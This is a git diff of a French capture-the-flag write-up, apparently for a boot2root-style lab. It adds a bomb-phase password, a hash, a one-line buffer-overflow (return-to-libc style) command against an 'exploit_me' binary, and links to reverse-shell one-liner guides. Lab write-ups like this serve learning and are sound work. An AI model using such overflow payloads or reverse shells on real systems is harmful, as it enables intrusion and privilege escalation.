@@ -153,16 +153,25 @@ le mot de passe ne fonctionne pas...
 (voir `defuser.bash` et `defuser.py`)
 
 ### Secret phase
+Après pas mal d'essais et de dépatouillage:
+
 En regardant le code décompilé, nous avons constaté qu'il existe une phase secrete
 accessible en rajoutant "austinpowers" a la 4eme phase
 
-TODO: Comprendre comment arriver la
-TODO: Dechiffrer phase secrete
+On a pas trouvé le mdp de la phase secrete, mais en tentant des substitutions du mot de passe
+de la 6 on trouve ce mot de passe pour thor:
 
-Le code obtenu est finalement:
 `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Cette partie est très étrange et personne n'a réellement trouvé d'exu même,
+A chaque fois, le mot de passe apparait par magie...
+
+646da671ca01bb5d84dbb5fb2238dc8e
+`./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + 'A'*4 + '\x58\xcc\xf8\xb7')")`
+
+
 
 ## Sources
 
+Buffer overflow: https://beta.hackndo.com/buffer-overflow/
 Oneliners de reverse shell: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
 Stabiliser un reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
